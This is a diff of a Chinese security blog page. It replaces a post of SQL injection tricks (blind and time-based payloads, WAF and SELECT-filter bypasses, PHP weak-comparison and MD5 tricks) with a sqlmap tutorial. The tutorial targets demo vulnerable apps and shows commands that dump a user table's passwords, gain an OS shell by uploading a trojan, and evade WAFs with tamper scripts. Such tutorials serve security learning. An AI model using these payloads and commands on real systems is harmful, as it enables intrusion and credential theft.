@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Mysql,Web安全,">
+  <meta name="keywords" content="SQL MAP,Web安全,">
 
 
 
@@ -79,18 +79,27 @@
 
 
 
-<meta name="description" content="一些常用指令1.当前数据库的所有表select group_concat(table_name separator &amp;#39;@&amp;#39;) from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select group_concat(column_name separator &amp;#39;@&amp;#39;)">
-<meta name="keywords" content="Mysql,Web安全">
+<meta name="description" content="Sqlmap使用Sqlmap有一些常用的命令后缀，详细见命令大全 GET注入查找Mysql数据库中的名称python sqlmap.py -u &amp;quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;amp;submit=submit&amp;quot; --dbs 然后Sqlmap会自动进行sql注入">
+<meta name="keywords" content="SQL MAP,Web安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入的总结和小技巧">
-<meta property="og:url" content="http://yoursite.com/2019/08/29/SQL注入的总结和小技巧/index.html">
+<meta property="og:title" content="SQLMAP的使用">
+<meta property="og:url" content="http://yoursite.com/2019/07/05/SQLMAP的使用/index.html">
 <meta property="og:site_name" content="Chen&#39;s Bolg">
-<meta property="og:description" content="一些常用指令1.当前数据库的所有表select group_concat(table_name separator &amp;#39;@&amp;#39;) from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select group_concat(column_name separator &amp;#39;@&amp;#39;)">
+<meta property="og:description" content="Sqlmap使用Sqlmap有一些常用的命令后缀，详细见命令大全 GET注入查找Mysql数据库中的名称python sqlmap.py -u &amp;quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;amp;submit=submit&amp;quot; --dbs 然后Sqlmap会自动进行sql注入">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-29T07:26:26.293Z">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/8.png">
+<meta property="og:updated_time" content="2019-08-29T07:37:27.732Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入的总结和小技巧">
-<meta name="twitter:description" content="一些常用指令1.当前数据库的所有表select group_concat(table_name separator &amp;#39;@&amp;#39;) from information_schema.TABLES where TABLE_SCHEMA=database();2.获取表中的所有列的名字select group_concat(column_name separator &amp;#39;@&amp;#39;)">
+<meta name="twitter:title" content="SQLMAP的使用">
+<meta name="twitter:description" content="Sqlmap使用Sqlmap有一些常用的命令后缀，详细见命令大全 GET注入查找Mysql数据库中的名称python sqlmap.py -u &amp;quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;amp;submit=submit&amp;quot; --dbs 然后Sqlmap会自动进行sql注入">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/05/SQLMAP的使用/1.png">
 
 
 
@@ -120,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/08/29/SQL注入的总结和小技巧/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/05/SQLMAP的使用/">
 
 
 
 
 
-  <title>SQL注入的总结和小技巧 | Chen's Bolg</title>
+  <title>SQLMAP的使用 | Chen's Bolg</title>
   
 
 
@@ -285,7 +294,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/SQL注入的总结和小技巧/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/05/SQLMAP的使用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Chen DY">
@@ -302,7 +311,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SQL注入的总结和小技巧</h1>
+          <h1 class="post-title" itemprop="name headline">SQLMAP的使用</h1>
         
 
         <div class="post-meta">
@@ -314,8 +323,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-29T15:24:01+08:00">
-                2019-08-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-05T16:34:08+08:00">
+                2019-07-05
               </time>
             
 
@@ -368,7 +377,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  796字
+                  2k字
                 </span>
               
 
@@ -384,7 +393,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3分钟
+                  7分钟
                 </span>
               
             </div>
@@ -405,23 +414,73 @@
       
 
       
-        <h2 id="一些常用指令"><a href="#一些常用指令" class="headerlink" title="一些常用指令"></a>一些常用指令</h2><p>1.当前数据库的所有表<br><code>select group_concat(table_name separator &#39;@&#39;) from information_schema.TABLES where TABLE_SCHEMA=database();</code><br>2.获取表中的所有列的名字<br><code>select group_concat(column_name separator &#39;@&#39;) from information_schema.columns where table_name=&#39;表名&#39;</code></p>
-<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><p>通常情况下可以使用mid和substring两个函数来进行布尔注入，哪个能用就使用哪个，另外在盲注的情况下可以使用ascii()来逐一判断表名列名等<br><code>(ascii(subtring(database(),1,1))=104</code><br><code>(ascii(mid(database(),1,1))=104</code></p>
-<p>但是WAF屏蔽了逗号的使用，那么两种函数都是用不了了，这时候可以换一种表述方式来进行注入，语句如下所示：<br><code>(ascii(substring(database() from 2))=111)</code><br><code>(mid(database() from 1 for 1))=&#39;a&#39;</code><br><code>(substring(database() from 1 for 1))=&#39;a&#39;</code></p>
-<p>另外如果需要用到if语句，也可以将逻辑换一种表达方式，可以使用<code>case when xxx then xxx else xxx end</code>的逻辑，其具体语法如下所示</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &lt;myColumnSpec&gt; = </span><br><span class="line"><span class="keyword">CASE</span> </span><br><span class="line"><span class="keyword">WHEN</span> &lt;A&gt; <span class="keyword">THEN</span> &lt;somethingA&gt; </span><br><span class="line"><span class="keyword">WHEN</span> &lt;B&gt; <span class="keyword">THEN</span> &lt;somethingB&gt; </span><br><span class="line"><span class="keyword">ELSE</span> &lt;somethingE&gt; </span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
+        <h1 id="Sqlmap使用"><a href="#Sqlmap使用" class="headerlink" title="Sqlmap使用"></a>Sqlmap使用</h1><p>Sqlmap有一些常用的命令后缀，详细见<br><a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">命令大全</a></p>
+<h2 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h2><h3 id="查找Mysql数据库中的名称"><a href="#查找Mysql数据库中的名称" class="headerlink" title="查找Mysql数据库中的名称"></a>查找Mysql数据库中的名称</h3><p><code>python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; --dbs</code></p>
+<p>然后Sqlmap会自动进行sql注入，可以在注入过程中选择注入的方式，筛选掉可能性不大的数据库，最后工具能够显示出所有数据库的名称，如下图所示</p>
+<img src="/2019/07/05/SQLMAP的使用/1.png">
 
-<p>举一个爆数据库名的例子：<br><code>1&#39; and case when (substring((select database()) from 1 for 1)=&#39;w&#39;) then sleep(3) else sleep(0) end and &#39;1&#39;=&#39;1</code></p>
-<h2 id="select屏蔽绕过、"><a href="#select屏蔽绕过、" class="headerlink" title="select屏蔽绕过、"></a>select屏蔽绕过、</h2><p>1,：转换个别字母大小写<br>2：输入SESELECTLECT之类的语句来代替SELECT<br>3：用转义的URL编码来代替SELECT（不知道这么表述对不对，就是%后面跟上16进制的ascii码……）<br>4：用/**/来隔开SELECT中的各个字母</p>
-<h2 id="PHP一些特性（漏洞）"><a href="#PHP一些特性（漏洞）" class="headerlink" title="PHP一些特性（漏洞）"></a>PHP一些特性（漏洞）</h2><p>弱类型比较：在某些情况下，PHP会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: 3 == ‘3ascasd’结果为true。</p>
-<h2 id="以0为开头的MD5值"><a href="#以0为开头的MD5值" class="headerlink" title="以0为开头的MD5值"></a>以0为开头的MD5值</h2><p>只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS </p>
-<h2 id="PHP布尔类型"><a href="#PHP布尔类型" class="headerlink" title="PHP布尔类型"></a>PHP布尔类型</h2><p>bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。</p>
-<h2 id="截断问题"><a href="#截断问题" class="headerlink" title="截断问题"></a>截断问题</h2><p>ereg函数漏洞：00截断</p>
-<h2 id="SHA1和MD5函数"><a href="#SHA1和MD5函数" class="headerlink" title="SHA1和MD5函数"></a>SHA1和MD5函数</h2><p>这两个PHP函数因为不能处理数组，所以在传入数组的时候会发生错误，在PHP中会直接返回一个False，因此在比较两者的hash值是否相等时，可以传入两个数组，因为false=false成立</p>
-<h2 id="jother编码"><a href="#jother编码" class="headerlink" title="jother编码"></a>jother编码</h2><p>如果在网页中出现一堆<a href></a>+!的东西就用jother解码</p>
-<p>在console将那堆解码的东西复制过去 按回车即可解码</p>
-<h2 id="设置伪造的IP地址"><a href="#设置伪造的IP地址" class="headerlink" title="设置伪造的IP地址"></a>设置伪造的IP地址</h2><p>在包头添加<code>Client-IP:</code>可以用来伪造当前客户端的IP地址，从而欺骗服务器</p>
-<h2 id="Mysql的用户名和密码"><a href="#Mysql的用户名和密码" class="headerlink" title="Mysql的用户名和密码"></a>Mysql的用户名和密码</h2><p>Mysql中可以直接使用username和password获取当前的用户名和密码（不知道对不对）</p>
+<h3 id="查找表的名称"><a href="#查找表的名称" class="headerlink" title="查找表的名称"></a>查找表的名称</h3><p>经过上述的阶段获取数据库的名称后，就可以用来注入查找各个表的名称，以BWVS数据库为例</p>
+<p><code>python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS --tables</code></p>
+<p>很快工具就能够返回BWVS数据库下的各个表的名称，如下图所示：</p>
+<img src="/2019/07/05/SQLMAP的使用/2.png">
+
+<h3 id="查找字段的名称"><a href="#查找字段的名称" class="headerlink" title="查找字段的名称"></a>查找字段的名称</h3><p>同理可以通过数据库，表来查找到里面字段的名称，以BWVS中的user表为例：<br><code>python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS -T user --columns</code></p>
+<p>工具输出的结果如下图所示：</p>
+<img src="/2019/07/05/SQLMAP的使用/3.png">
+
+
+<h3 id="获取字段的值"><a href="#获取字段的值" class="headerlink" title="获取字段的值"></a>获取字段的值</h3><p>对于上述扫描出的结果，即bill,pwd,uid,uname这几个字段名称，可以通过如下指令来注入获取字段下的值</p>
+<p><code>python sqlmap.py -u &quot;http://demo.rushrush.com/bwvs//bug/sql_injection/sql_string.php?title=333&amp;submit=submit&quot; -D BWVS -T user -C &quot;bill,pwd,uid,uname&quot;  --dump</code></p>
+<p>输出的结果如下所示：</p>
+<img src="/2019/07/05/SQLMAP的使用/4.png">
+
+<h2 id="检测级别"><a href="#检测级别" class="headerlink" title="检测级别"></a>检测级别</h2><h3 id="–level参数"><a href="#–level参数" class="headerlink" title="–level参数"></a>–level参数</h3><p>此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。 Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span>AND boolean-based blind - WHERE or HAVING clause (Generic comment)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">stype</span>&gt;</span>1<span class="tag">&lt;/<span class="name">stype</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">level</span>&gt;</span>2<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">risk</span>&gt;</span>1<span class="tag">&lt;/<span class="name">risk</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">clause</span>&gt;</span>1<span class="tag">&lt;/<span class="name">clause</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">where</span>&gt;</span>1<span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">vector</span>&gt;</span>AND [INFERENCE]<span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">payload</span>&gt;</span>AND [RANDNUM]=[RANDNUM]<span class="tag">&lt;/<span class="name">payload</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">comment</span>&gt;</span>[GENERIC_SQL_COMMENT]<span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">comparison</span>&gt;</span>AND [RANDNUM]=[RANDNUM1]<span class="tag">&lt;/<span class="name">comparison</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上例中可以看到有level标签，其值为2，该payload在检测级别大于等于2时被使用。 risk标签的含义见后文。</p>
+<p>检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的， 检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。</p>
+<p>若不是很清楚注入点在哪里可以设置一个比较高的检测级别。</p>
+<p>强烈建议在向Sqlmap官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。</p>
+<h3 id="–risk"><a href="#–risk" class="headerlink" title="–risk"></a>–risk</h3><p>此参数用于指定风险等级，有1~4共4级。默认风险等级为1，此等级在大多数情况下对测试目标无害。 风险等级2添加了基于时间的注入测试，等级3添加了OR测试。</p>
+<p>若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据，这显然不是攻击者想要看到的。 因此用户需要能控制风险等级避开有潜在风险的payload。</p>
+<h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>可以通过使用<code>–method=METHOD</code>  强制使用给定的HTTP方法<br>如与网站是通过POST来传递信息，则需要使用到BRUP截获请求包，然后将请求包中的内容前加到sqlmap的后缀中实行注入，例如：<br><code>--data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。--data=&quot;id=1&quot; -f --banner --dbs --users</code></p>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>如果网站需要账号密码登陆，则在进行SQL注入测试时可以考虑使用cookie，使用方法就是在命令末尾添加<code>-cookie</code>，下面是一个例子：<br><code>D:\sqlmap&gt;python sqlmap.py -u &quot;http://demo.rushrush.com/dvwa/vulnerabilities/sqli_blind/?id=221&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=6rub5m2okhp2ib7u7ruj76ebt1&quot; --dbs</code></p>
+<p>通过以上命令可以像前文的相似命令一样获取数据库名字，cookie只不过多了一个登陆凭证而已</p>
+<h2 id="属性头注入"><a href="#属性头注入" class="headerlink" title="属性头注入"></a>属性头注入</h2><p>有些参数可能是通过一个包的属性头来传输的，因此可以通过属性头来进行SQL注入，在sqlmap中可以用<code>--referer</code>来实现注入，因为sqlmap可以在请求中伪造HTTP中的referer，当<code>-level</code>参数设定为3或者3以上的时候会尝试对referer注入</p>
+<p>添加额外的HTTP头的参数为<code>-headers</code></p>
+<h2 id="注入过程中-的使用"><a href="#注入过程中-的使用" class="headerlink" title="注入过程中*的使用"></a>注入过程中<code>*</code>的使用</h2><p>在输入过程中，在一个注入点后加<code>*</code>，可以使得该注入点的优先级别最高</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>通过命令执行可以取得服务器端的shell<br>sqlmap进行命名执行可以在语句后加后缀<code>-os-shell</code><br>要执行以上命令，首先要确保该网页确实存在SQL注入漏洞</p>
+<img src="/2019/07/05/SQLMAP的使用/5.png">
+
+<p>如上图所示选择服务器端语言，另外可以选择服务器端上传木马的目录，可以选择2来人为选定，前提是必须爆出网站的物理路径：此方法比较多，比如：PHPinfo文件，访问错误报路径，debug调试开启爆路径等。</p>
+<p>上传木马成功后，可以通过访问上图所示的路径来执行，下图是访问该路径并执行命令显示当前路径所有文件的结果</p>
+<img src="/2019/07/05/SQLMAP的使用/6.png">
+
+<h2 id="数据包注入"><a href="#数据包注入" class="headerlink" title="数据包注入"></a>数据包注入</h2><p>因为前面那些添加属性头，增加cookie的方法比较麻烦，因此就出现了从文件读取数据包来进行注入的方式，其实现的后缀为<code>-r</code></p>
+<p>结合burpsuite来使用sqlmap：</p>
+<p>（1）浏览器打开目标地址<a href="http://www.antian365.com" target="_blank" rel="noopener">http://www.antian365.com</a></p>
+<p>（2）配置burp代理(127.0.0.1:8080)以拦截请求</p>
+<p>（3）点击登录表单的submit按钮</p>
+<p>（4）Burp会拦截到了我们的登录POST请求</p>
+<p>（5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</p>
+<p>（6）运行sqlmap并使用如下命令：</p>
+<p><code>./sqlmap.py -r post.txt</code>明显语句长度短了很多。。</p>
+<h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><p>可以添加后缀<code>-proxy</code>来实现代理，例如<code>-proxy &quot;http://127.0.0.1:8080&quot;</code>可以实现burp的截获</p>
+<p><code>-threads</code>采用多线程，后面接想要的线程数</p>
+<p><code>-sql-query</code>执行指定的sql语句</p>
+<p><code>file-read</code>读取指定文件</p>
+<p><code>file-write``file-dest</code>写入本地文件，前面一个加本地目录，后一个加服务器的指定位置</p>
+<p><code>dbms</code>指定数据库类型（mysql,oracle,qostgreSQL…）</p>
+<h2 id="tamper自定义脚本"><a href="#tamper自定义脚本" class="headerlink" title="tamper自定义脚本"></a>tamper自定义脚本</h2><p>sqlmap下的tamper文件夹下存放的是一些脚本，也可以通过添加自己写的脚本来运行。</p>
+<p>WAF，Web Application Firewall，即网站应用级入侵防御系统，通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护，有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。</p>
+<p>为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。</p>
+<p>当原始注入遇到困难时，可尝试加载相应脚本，进行绕过，说不定会有意外惊喜。在sqlmap的原命令中加入以下代码，即可使用脚本，进行更加强有力的渗透。</p>
+<p><code>--tamper“脚本名称”</code></p>
+<p>sqlmap版本当前为1.2.7.20，共有57个tamper脚本，与1.0版本相比新增了19个脚本。</p>
+<img src="/2019/07/05/SQLMAP的使用/7.png">
+<img src="/2019/07/05/SQLMAP的使用/8.png">
+
+<h2 id="sqlmap-dns查询"><a href="#sqlmap-dns查询" class="headerlink" title="sqlmap dns查询"></a>sqlmap dns查询</h2><p>利用sqlmap dns后缀来进行DNS查询，后缀为<code>--dns-domain</code></p>
 
       
     </div>
@@ -439,7 +498,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Mysql/" rel="tag"><i class="fa fa-tag"></i> Mysql</a>
+            <a href="/tags/SQL-MAP/" rel="tag"><i class="fa fa-tag"></i> SQL MAP</a>
           
             <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
           
@@ -454,8 +513,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/29/文件上传的简单介绍/" rel="next" title="文件上传的简单介绍">
-                <i class="fa fa-chevron-left"></i> 文件上传的简单介绍
+              <a href="/2019/07/02/SQL注入的总结和小技巧/" rel="next" title="SQL注入的总结和小技巧">
+                <i class="fa fa-chevron-left"></i> SQL注入的总结和小技巧
               </a>
             
           </div>
@@ -463,6 +522,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/29/文件上传的简单介绍/" rel="prev" title="文件上传的简单介绍">
+                文件上传的简单介绍 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -563,7 +626,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -596,7 +659,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一些常用指令"><span class="nav-number">1.</span> <span class="nav-text">一些常用指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔注入"><span class="nav-number">2.</span> <span class="nav-text">布尔注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#select屏蔽绕过、"><span class="nav-number">3.</span> <span class="nav-text">select屏蔽绕过、</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP一些特性（漏洞）"><span class="nav-number">4.</span> <span class="nav-text">PHP一些特性（漏洞）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#以0为开头的MD5值"><span class="nav-number">5.</span> <span class="nav-text">以0为开头的MD5值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP布尔类型"><span class="nav-number">6.</span> <span class="nav-text">PHP布尔类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#截断问题"><span class="nav-number">7.</span> <span class="nav-text">截断问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SHA1和MD5函数"><span class="nav-number">8.</span> <span class="nav-text">SHA1和MD5函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jother编码"><span class="nav-number">9.</span> <span class="nav-text">jother编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置伪造的IP地址"><span class="nav-number">10.</span> <span class="nav-text">设置伪造的IP地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql的用户名和密码"><span class="nav-number">11.</span> <span class="nav-text">Mysql的用户名和密码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqlmap使用"><span class="nav-number">1.</span> <span class="nav-text">Sqlmap使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GET注入"><span class="nav-number">1.1.</span> <span class="nav-text">GET注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查找Mysql数据库中的名称"><span class="nav-number">1.1.1.</span> <span class="nav-text">查找Mysql数据库中的名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找表的名称"><span class="nav-number">1.1.2.</span> <span class="nav-text">查找表的名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找字段的名称"><span class="nav-number">1.1.3.</span> <span class="nav-text">查找字段的名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取字段的值"><span class="nav-number">1.1.4.</span> <span class="nav-text">获取字段的值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检测级别"><span class="nav-number">1.2.</span> <span class="nav-text">检测级别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#–level参数"><span class="nav-number">1.2.1.</span> <span class="nav-text">–level参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#–risk"><span class="nav-number">1.2.2.</span> <span class="nav-text">–risk</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST注入"><span class="nav-number">1.3.</span> <span class="nav-text">POST注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie注入"><span class="nav-number">1.4.</span> <span class="nav-text">cookie注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#属性头注入"><span class="nav-number">1.5.</span> <span class="nav-text">属性头注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入过程中-的使用"><span class="nav-number">1.6.</span> <span class="nav-text">注入过程中*的使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">1.7.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据包注入"><span class="nav-number">1.8.</span> <span class="nav-text">数据包注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用参数"><span class="nav-number">1.9.</span> <span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tamper自定义脚本"><span class="nav-number">1.10.</span> <span class="nav-text">tamper自定义脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-dns查询"><span class="nav-number">1.11.</span> <span class="nav-text">sqlmap dns查询</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -630,7 +693,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">7.7k</span>
+    <span title="Site words total count">9.7k</span>
   
 </div>
 
